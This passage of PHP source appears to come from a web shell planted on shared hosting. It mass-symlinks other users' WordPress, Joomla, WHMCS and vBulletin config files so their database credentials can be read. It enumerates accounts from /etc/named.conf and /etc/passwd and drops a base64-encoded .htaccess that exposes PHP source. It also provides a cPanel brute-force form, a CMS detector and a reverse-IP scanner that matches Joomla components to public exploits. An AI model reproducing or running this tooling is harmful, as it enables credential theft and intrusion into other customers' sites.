                symlink('/home5/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home5/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home5/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home5/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home5/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home5/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home5/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home5/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home5/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home5/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home5/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home5/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home5/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home5/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home5/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home5/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home5/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home5/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home5/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home5/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home5/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home6/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home6/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home6/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home6/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home6/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home6/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home6/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home6/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home6/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home6/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home6/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home6/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home6/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home6/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home6/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home6/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home6/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home6/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home6/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home6/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home6/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home6/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home6/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home6/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home6/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home6/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home6/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home6/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home6/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home6/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
                symlink('/home7/' . $usern . '/public_html/vb/includes/config.php', $pdomain . '~~vBulletin1.txt');
                symlink('/home7/' . $usern . '/public_html/includes/config.php', $pdomain . '~~vBulletin2.txt');
                symlink('/home7/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~vBulletin3.txt');
                symlink('/home7/' . $usern . '/public_html/cc/includes/config.php', $pdomain . '~~vBulletin4.txt');
                symlink('/home7/' . $usern . '/public_html/config.php', $pdomain . '~~Phpbb1.txt');
                symlink('/home7/' . $usern . '/public_html/forum/includes/config.php', $pdomain . '~~Phpbb2.txt');
                symlink('/home7/' . $usern . '/public_html/wp-config.php', $pdomain . '~~Wordpress1.txt');
                symlink('/home7/' . $usern . '/public_html/blog/wp-config.php', $pdomain . '~~Wordpress2.txt');
                symlink('/home7/' . $usern . '/public_html/configuration.php', $pdomain . '~~Joomla1.txt');
                symlink('/home7/' . $usern . '/public_html/blog/configuration.php', $pdomain . '~~Joomla2.txt');
                symlink('/home7/' . $usern . '/public_html/joomla/configuration.php', $pdomain . '~~Joomla3.txt');
                symlink('/home7/' . $usern . '/public_html/whm/configuration.php', $pdomain . '~~Whm1.txt');
                symlink('/home7/' . $usern . '/public_html/whmc/configuration.php', $pdomain . '~~Whm2.txt');
                symlink('/home7/' . $usern . '/public_html/support/configuration.php', $pdomain . '~~Whm3.txt');
                symlink('/home7/' . $usern . '/public_html/client/configuration.php', $pdomain . '~~Whm4.txt');
                symlink('/home7/' . $usern . '/public_html/billings/configuration.php', $pdomain . '~~Whm5.txt');
                symlink('/home7/' . $usern . '/public_html/billing/configuration.php', $pdomain . '~~Whm6.txt');
                symlink('/home7/' . $usern . '/public_html/clients/configuration.php', $pdomain . '~~Whm7.txt');
                symlink('/home7/' . $usern . '/public_html/whmcs/configuration.php', $pdomain . '~~Whm8.txt');
                symlink('/home7/' . $usern . '/public_html/order/configuration.php', $pdomain . '~~Whm9.txt');
                symlink('/home7/' . $usern . '/public_html/admin/conf.php', $pdomain . '~~5.txt');
                symlink('/home7/' . $usern . '/public_html/admin/config.php', $pdomain . '~~4.txt');
                symlink('/home7/' . $usern . '/public_html/conf_global.php', $pdomain . '~~invisio.txt');
                symlink('/home7/' . $usern . '/public_html/include/db.php', $pdomain . '~~7.txt');
                symlink('/home7/' . $usern . '/public_html/connect.php', $pdomain . '~~8.txt');
                symlink('/home7/' . $usern . '/public_html/mk_conf.php', $pdomain . '~~mk-portale1.txt');
                symlink('/home7/' . $usern . '/public_html/include/config.php', $pdomain . '~~12.txt');
                symlink('/home7/' . $usern . '/public_html/settings.php', $pdomain . '~~Smf.txt');
                symlink('/home7/' . $usern . '/public_html/includes/functions.php', $pdomain . '~~phpbb3.txt');
                symlink('/home7/' . $usern . '/public_html/include/db.php', $pdomain . '~~infinity.txt');
            }
            $d0mains = @file('/etc/named.conf');
            if ($d0mains) {
                mkdir($fn);
                chdir($fn);
                foreach ($d0mains as $d0main) {
                    if (eregi('zone', $d0main)) {
                        preg_match_all('#zone "(.*)"#', $d0main, $domains);
                        flush();
                        if (strlen(trim($domains[1][0])) > 2) {
                            $user = posix_getpwuid(@fileowner('/etc/valiases/' . $domains[1][0]));
                            syml($user['name'], $domains[1][0]);
                        }
                    }
                }
                echo '<center><font color=lime size=3>[ Done ]</font></center>';
                echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>";
            } else {
                mkdir($fn);
                chdir($fn);
                $temp = '';
                $val1 = 0;
                $val2 = 1000;
                for (; $val1 <= $val2; ++$val1) {
                    $uid = @posix_getpwuid($val1);
                    if ($uid) {
                        $temp .= join(':', $uid) . '
';
                    }
                }
                echo '<br/>';
                $temp = trim($temp);
                $file5 = fopen('test.txt', 'w');
                fputs($file5, $temp);
                fclose($file5);
                $htaccess = 'T3B0aW9ucyBhbGwgCkRpcmVjdG9yeUluZGV4IHJlYWRtZS5odG1sIApBZGRUeXBlIHRleHQvcGxh
aW4gLnBocCAKQWRkSGFuZGxlciBzZXJ2ZXItcGFyc2VkIC5waHAgCkFkZFR5cGUgdGV4dC9wbGFp
biAuaHRtbCAKQWRkSGFuZGxlciB0eHQgLmh0bWwgClJlcXVpcmUgTm9uZSAKU2F0aXNmeSBBbnk=
';
                $file = fopen('.htaccess', 'w+');
                $write = fwrite($file, base64_decode($htaccess));
                $file = fopen('test.txt', 'r') or exit('Unable to open file!');
                while (!feof($file)) {
                    $s = fgets($file);
                    $matches = [];
                    $t = preg_match('/\/(.*?)\:\//s', $s, $matches);
                    $matches = str_replace('home/', '', $matches[1]);
                    if (strlen($matches) > 12 || 0 == strlen($matches) || 'bin' == $matches || 'etc/X11/fs' == $matches || 'var/lib/nfs' == $matches || 'var/arpwatch' == $matches || 'var/gopher' == $matches || 'sbin' == $matches || 'var/adm' == $matches || 'usr/games' == $matches || 'var/ftp' == $matches || 'etc/ntp' == $matches || 'var/www' == $matches || 'var/named' == $matches) {
                        continue;
                    }
                    syml($matches, $matches);
                }
                fclose($file);
                echo '</table>';
                unlink('test.txt');
                echo '<center><font color=lime size=3>[ Done ]</font></center>';
                echo "<br><center><a href=$fn/ target=_blank><font size=3 color=#009900>| Go Here |</font></a></center>";
            }
            echo '<hr><center><b><a href=' . $_SERVER['PHP_SELF'] . '>BACK</a>';
            exit;
        } ?>
<form method="POST" target="_blank">
	<strong>
<input name="page" type="hidden" value="find"><table>      				
    </strong><br><br><center><font size="5" style="italic" color="#428bca">=[ Cpanel BruteForce ]=</font></center><br><br>
    <table width="600" border="0" cellpadding="3" cellspacing="1" align="center">
	<tr>
	<td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<center><b><font size="5" style="italic" color="#428bca">Cpanel BruteForce</font></b></center></td></tr>
    <tr>
    <td>
    <table width="100%" border="0" cellpadding="3" cellspacing="1" align="center">
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>User :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="usernames"><?php system('ls /var/mail'); ?></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Pass :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><textarea cols="79" class ='inputz' rows="10" name="passwords"></textarea></strong></td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" class="style2" style="width: 139px">
	<strong>Type :</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
    <span class="style2"><strong>Simple : </strong> </span>
	<strong>
	<input type="radio" name="type" value="simple" checked="checked" class="style3"></strong>
    <font class="style2"><strong>/etc/passwd : </strong> </font>
	<strong>
	<input type="radio" name="type" value="passwd" class="style3"></strong><span class="style3"><strong>
	</strong>
	</span>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515"  colspan="5"><strong><input class ='inputzbut' type="submit" value="start">
    </strong>
    </td>
    <tr>
</form> 
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Config :</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="mendapatkan" type="hidden" value="passwd">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Folder Name :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="foldername" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>   
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Get Wordlist</strong></td>
    				</tr>
<form method="POST" target="_blank">
	<strong>
<input name="pass" type="hidden" value="password">        				
    </strong>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Url Config :</strong></td>
    <td valign="top" bgcolor="#151515"><strong><input class ='inputz' size="35" name="url" type="text"></strong></td>
	</strong>
    </td>
    </tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"></td>
    <td valign="top" bgcolor="#151515" colspan="5"><strong><input class ='inputzbut' type="submit" value="GO">
    </strong>
    </td>
    <tr>
</form>
<tr>
    <td valign="top" bgcolor="#151515" class="style1" colspan="6"><strong>Info 
	Security</strong></td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Safe Mode</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<?php
    $safe_mode = ini_get('safe_mode');
        if ('1' == $safe_mode) {
            echo 'ON';
        } else {
            echo 'OFF';
        } ?>	
	</strong>	
	</td>
    				</tr>
    <tr>
    <td valign="top" bgcolor="#151515" style="width: 139px"><strong>Desible Function</strong></td>
    <td valign="top" bgcolor="#151515" colspan="5">
	<strong>
<form method="POST" target="_blank">
	<strong>
<input name="matikan" type="hidden" value="sekatan">        				
    </strong>

<?php
    if ('' == ($func = @ini_get('disable_functions'))) {
        echo '<font color=#428bca>No Security for Function</font></b>';
    } else {
        echo '<script>alert("Please see below and press >Please Click Here First!<");</script>';
        echo "<font color=#428bca>$func</font></b>";
        echo '<tr><td valign="top" bgcolor="#151515" style="width: 139px"></td>';
        echo '<td valign="top" bgcolor="#151515" colspan="5"><strong><input type="submit" value="Please Click Here First!">
    </strong>
    </td></tr>';
    } ?></strong></td></tr></table></table></table>
<?php
    }
///////////////////////////////////////////////////////////////////////////

elseif (isset($_GET['x']) && ('tutor' == $_GET['x'])) {
    ?>
	<form action="?y=<?php echo $pwd; ?>&x=tutor" method="post">
	<center><br><br><b>+--=[ Tutorial & Ebook hacking ]=--+</b><br>
		<form method="post" action="">
<table class="tabnet" border="1" >
<tr>
		<td align="center">English</td><td align="center">Indonesian</td>
	</tr>
	<tr>
		<td><form method="post" action="">&nbsp;
	E-book Hacking &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="tutorial24" > Hacking Exposed-5 </option>
	<option value="tutorial25"> Internet Denial Of Service </option>
	<option value="tutorial26">Computer Viruses For Dummies</option>
	<option value="tutorial27">Hack Attacks Testing</option>
	<option value="tutorial28">Secrets Of A Super Hacker</option>
	<option value="tutorial29">Stealing The Network</option>
	<option value="tutorial30">Hacker's HandBook</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
	</td></form>
<td><form method="post" action="">&nbsp;
Tutorial by X'1N73CT &nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
		<option value="tutorial2">Search Engine Hacking</option>
		<option value="tutorial3">SQL Injection dengan hackbar</option>
		<option value="tutorial1" >Bypass Union</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
</tr>
<tr>
<td>
<form method="post" action="">&nbsp;
E-Book from Syn|gress &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut"  name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="cryptography_for_defeloper">Cryptography for Developer</option>
	<option value="tutorial31">Mobile Malware Attack and Defense</option>
	<option value="forensic">CD and DVD Forensic</option>
	<option value="ddd">Open Sourch Security Tools</option>
	<option value="metasploit">Metaslpoit Toolkit</option>
	<option value="stealing_network">Stealing the Network</option>
	<option value="security_polices">Creating Security Polices</option>
	</select>
	<input  type="submit" name="submit" class="inputzbut" value="Download">
</form></td>
<td>
<form method="post" action="">&nbsp;
X-CODE MAGAZINE &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;:&nbsp;
	<select class="inputzbut" name="pilih" id="pilih">
	<option value=""selected>-----------------[ Select ]-----------------</option>
	<option value="tutorial4">X-CODE MAGAZINE 1</option>
	<option value="tutorial5">X-CODE MAGAZINE 2</option>
	<option value="tutorial6">X-CODE MAGAZINE 3</option>
	<option value="tutorial7">X-CODE MAGAZINE 4</option>
	<option value="tutorial8">X-CODE MAGAZINE 5</option>
	<option value="tutorial9">X-CODE MAGAZINE 6</option>
	<option value="tutorial10">X-CODE MAGAZINE 7</option>
	<option value="tutorial11">X-CODE MAGAZINE 8</option>
	<option value="tutorial12">X-CODE MAGAZINE 9</option>
	<option value="tutorial13">X-CODE MAGAZINE 10</option>
	<option value="tutorial14">X-CODE MAGAZINE 11</option>
	<option value="tutorial15">X-CODE MAGAZINE 12</option>
	<option value="tutorial16">X-CODE MAGAZINE 13</option>
	<option value="tutorial17">X-CODE MAGAZINE 14</option>
	<option value="tutorial18">X-CODE MAGAZINE 15</option>
	<option value="tutorial19">X-CODE MAGAZINE 16</option>
	<option value="tutorial20">X-CODE MAGAZINE 17</option>
	<option value="tutorial21">X-CODE MAGAZINE 18</option>
	<option value="tutorial22">X-CODE MAGAZINE 19</option>
	<option value="tutorial23">X-CODE MAGAZINE 20</option>
	<option value="tutorial024">X-CODE MAGAZINE 21</option>
	</select>
	<input type="submit" name="submit" class="inputzbut" value="Download" ></a>
</form></td></tr></table><br><br>
<?php
    $submit = $_POST['submit'];
    if (isset($submit)) {
        $pilih = $_POST['pilih'];
        if ('tutorial1' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/by_passing_illegal_mix_of_collations_for_operation__union__by_x_1n73ct.pdf';
			</script>
			<?php
        } elseif ('tutorial2' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Search_engine_hacking_by_x_1n73ct.pdf';
			</script>
			<?php
        } elseif ('tutorial3' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.pharmconseil-elearning.com/main/upload/Sql_injection_dengan_hackbar.pdf';
			</script>
			<?php
        } elseif ('tutorial4' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_1.zip';
			</script>
			<?php
        } elseif ('tutorial5' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_2.zip';
			</script>
			<?php
        } elseif ('tutorial6' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_3.zip';
			</script>
			<?php
        } elseif ('tutorial7' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_4.zip';
			</script>
			<?php
        } elseif ('tutorial8' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_5.rar';
			</script>
			<?php
        } elseif ('tutorial9' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_6.rar';
			</script>
			<?php
        } elseif ('tutorial10' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_7.rar';
			</script>
			<?php
        } elseif ('tutorial11' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode_magazine_8.rar';
			</script>
			<?php
        } elseif ('tutorial12' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode9.zip';
			</script>
			<?php
        } elseif ('tutorial13' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode10.zip';
			</script>
			<?php
        } elseif ('tutorial14' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/xcode11.zip';
			</script>
			<?php
        } elseif ('tutorial15' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode12.zip';
			</script>
			<?php
        } elseif ('tutorial16' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode13.zip';
			</script>
			<?php
        } elseif ('tutorial17' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/files/Xcode14.zip';
			</script>
			<?php
        } elseif ('tutorial18' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/Xcode15.zip';
			</script>
			<?php
        } elseif ('tutorial19' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_16.zip';
			</script>
			<?php
        } elseif ('tutorial20' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_17.zip';
			</script>
			<?php
        } elseif ('tutorial21' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_18.zip';
			</script>
			<?php
        } elseif ('tutorial22' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_19.zip';
			</script>
			<?php
        } elseif ('tutorial23' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_20.zip';
			</script>
			<?php
        } elseif ('tutorial024' == $pilih) {
            ?>
			<script>
				document.location = 'http://xcode.or.id/xcode_magazine_21.zip';
			</script>
			<?php
        } elseif ('tutorial24' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hacking_exposed_5.rar';
			</script>
			<?php
        } elseif ('tutorial25' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/internet_denial_of_service.rar';
			</script>
			<?php
        } elseif ('tutorial26' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/computer_viruses_for_dummies.rar';
			</script>
			<?php
        } elseif ('tutorial27' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/hack_attacks_testing.rar';
			</script>
			<?php
        } elseif ('tutorial28' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/secrets_of_super_hacker.rar';
			</script>
			<?php
        } elseif ('tutorial29' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/stealing_network_how_to_own_shadow.rar';
			</script>
			<?php
        } elseif ('tutorial30' == $pilih) {
            ?>
			<script>
				document.location = 'http://www.insecure.in/ebooks/webapp_hackers_handbook.rar';
			</script>
			<?php
        } elseif ('ddd' == $pilih) {
            ?>
			<script>
				document.location = 'http://199.91.153.95/t8dni7k639hg/3o321lcwwk8u5bh/Open_Source_Security_Tools.pdf';
			</script>
			<?php
        } elseif ('tutorial31' == $pilih) {
            ?>
			<script>
				document.location = 'http://205.196.121.149/sg22hm8qjbhg/afsa7ibbk4ny2kd/Mobile_Malware_Attacks_and_Defense.pdf';
			</script>
			<?php
        } elseif ('cryptography_for_defeloper' == $pilih) {
            ?>
			<script>
				document.location = 'http://205.196.121.248/0sod33qw66ug/wypyz555sc9bn7h/Cryptography_for_Developers.pdf';
			</script>
			<?php
        } elseif ('forensic' == $pilih) {
            ?>
			<script>
				document.location = 'http://205.196.120.85/uisebgmioyjg/6l70l00ba9yoksq/CD_and_DVD_Forensics.pdf';
			</script>
			<?php
        } elseif ('metasploit' == $pilih) {
            ?>
			<script>
				document.location = 'http://199.91.153.192/3t115p2f6gvg/zvrrddmq6icqtd2/Metasploit_Toolkit.pdf';
			</script>
			<?php
        } elseif ('stealing_network' == $pilih) {
            ?>
			<script>
				document.location = 'http://205.196.123.138/wbsxltb8rbtg/5vm8a1d23i9zje3/Stealing_the_Network_-_How_to_Own_the_Box.pdf';
			</script>
			<?php
        } elseif ('security_polices' == $pilih) {
            ?>
			<script>
				document.location = 'http://199.91.153.73/6le01f562ehg/6l5ep021dhvlhlq/Creating_Security_Policies_and_Implementing_Identity_Management_with_Active_Directory.pdf';
			</script>
			<?php
        }
    }
}
////////////////////////////////////////////////////////////////////
//////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('cms_detect' == $_GET['x'])) {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=cms_detect" method="post">
	<br><br><br><br><center><b><font size=4>+--=[ CMS Detector ]=--+</font></b></center><br><br>
    <?php
    if (!file_exists('pee.tmp')) {
        @fopen('pee.tmp', 'w');
        echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
        echo '<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table>';
        $p = 0;
        if (is_readable('/var/named')) {
            $list = scandir('/var/named');
            $current_dir = posix_getcwd();
            $dir = explode('/', $current_dir);
            foreach ($list as $domain) {
                if (strpos($domain, '.db')) {
                    $domain = str_replace('.db', '', $domain);
                    $owner = posix_getpwuid(fileowner('/etc/valiases/' . $domain));
                    error_reporting(0);
                    $link = $pageURL . 'pee/' . $owner['name'];
                    cms_add($link, $domain, $owner['name'], 'WordPress');
                    cms_add($link, $domain, $owner['name'], 'Joomla');
                    cms_add($link, $domain, $owner['name'], 'vBulletin');
                    cms_add($link, $domain, $owner['name'], 'WHMCS');
                    cms_add($link, $domain, $owner['name'], 'PhpBB');
                    cms_add($link, $domain, $owner['name'], 'MyBB');
                    cms_add($link, $domain, $owner['name'], 'IPB');
                    cms_add($link, $domain, $owner['name'], 'SMF');
                    cms_add($link, $domain, $owner['name'], 'Drupal');
                    cms_add($link, $domain, $owner['name'], 'e107');
                    cms_add($link, $domain, $owner['name'], 'Seditio');
                    cms_add($link, $domain, $owner['name'], 'osCommerce');
                }
            }
        }
    } else {
        echo '<table align="center" border="1" width="45%" cellspacing="0" cellpadding="4" class="td1">';
        echo '<tr><td><center><b>SITE</b></center></td><td><center><b>USER</b></center></td><td><center><b>CMS</b></center></td></table><br><br>';
        $content = file_get_contents($pageURL . 'pee.tmp');
        echo $content;
    }
}
/////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('jss' == $_GET['x'])) {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=jss" method="post">
    <?php
    echo '

<br><br><br><p align="center"><b><font size="3">Enter Targeting IP</font></b></p><br>
<form method="POST">
        <p align="center"><input type="text" class="inputz" name="site" size="65"><input class="inputzbut" type="submit" value="Scan"></p>
</form><center>

';
    @set_time_limit(0);
    @error_reporting(E_ALL | E_NOTICE);
    function check_exploit($comxx)
    {
        $link = "http://www.exploit-db.com/search/?action=search&filter_page=1&filter_description=$comxx&filter_exploit_text=&filter_author=&filter_platform=0&filter_type=0&filter_lang_id=0&filter_port=&filter_osvdb=&filter_cve=";
        $result = @file_get_contents($link);
        if (eregi('No results', $result)) {
            echo "<td>Not Found</td><td><a href='http://www.google.com/#hl=en&q=download+$comxx+joomla+extension'>Download</a></td></tr>";
        } else {
            echo "<td><a href='$link'>Found</a></td><td><=</td></tr>";
        }
    }
    function check_com($url)
    {
        $source = @file_get_contents($url);
        preg_match_all('{option,(.*?)/}i', $source, $f);
        preg_match_all('{option=(.*?)(&amp;|&|")}i', $source, $f2);
        preg_match_all('{/components/(.*?)/}i', $source, $f3);
        $arz = array_merge($f2[1], $f[1], $f3[1]);
        $coms = [];
        foreach (array_unique($arz) as $x) {
            $coms[] = $x;
        }
        foreach ($coms as $comm) {
            echo "<tr><td>$comm</td>";
            check_exploit($comm);
        }
    }
    function sec($site)
    {
        preg_match_all('{http://(.*?)(/index.php)}siU', $site, $sites);
        if (eregi('www', $sites[0][0])) {
            return $site = str_replace('index.php', '', $sites[0][0]);
        } else {
            return $site = str_replace('http://', 'http://www.', str_replace('index.php', '', $sites[0][0]));
        }
    }
    $npages = 50000;
    if ($_POST) {
        $ip = trim(strip_tags($_POST['site']));
        $npage = 1;
        $allLinks = [];
        while ($npage <= $npages) {
            $x = @file_get_contents('http://www.bing.com/search?q=ip%3A' . $ip . '+index.php?option=com&first=' . $npage);
            if ($x) {
                preg_match_all('(<div class="sb_tlst">.*<h3>.*<a href="(.*)".*>(.*)</a>.*</h3>.*</div>siU', $x, $findlink);
                foreach ($findlink[1] as $fl) {
                    $allLinks[] = sec($fl);
                }
                $npage = $npage + 10;
                if (0 == preg_match('(first=' . $npage . '&amp)siU', $x, $linksuiv)) {
                    break;
                }
            } else {
                break;
            }
        }
        $allDmns = [];
        foreach ($allLinks as $kk => $vv) {
            $allDmns[] = $vv;
        }
        echo '<table border="1"  width=\"80%\" align=\"center\">
<tr><td width=\"30%\"><b>Server IP&nbsp;&nbsp;&nbsp;&nbsp; : </b></td><td><b>' . $ip . '</b></td></tr>                    
<tr><td width=\"30%\"><b>Sites Found&nbsp; : </b></td><td><b>' . count(array_unique($allDmns)) . '</b></td></tr>
</table>';
        echo '<br><br>';
        echo '<table border="1" width="80%" align=\"center\">';
        foreach (array_unique($allDmns) as $h3h3) {
            echo '<tr id=new><td><b><a href=' . $h3h3 . '>' . $h3h3 . '</a></b></td><td><b>Exploit-db</b></td><td><b>challenge of Exploiting ..!</b></td></tr>';
            check_com($h3h3);
        }
        echo '</table>';
    }
}
/////////////////////////////////////////////////////////////////
elseif (isset($_GET['x']) && ('dump' == $_GET['x'])) {
    ?>
    <form action="?y=<?php echo $pwd; ?>&x=dump" method="post">
    <?php
    echo $head . '<p align="center">';
    echo '
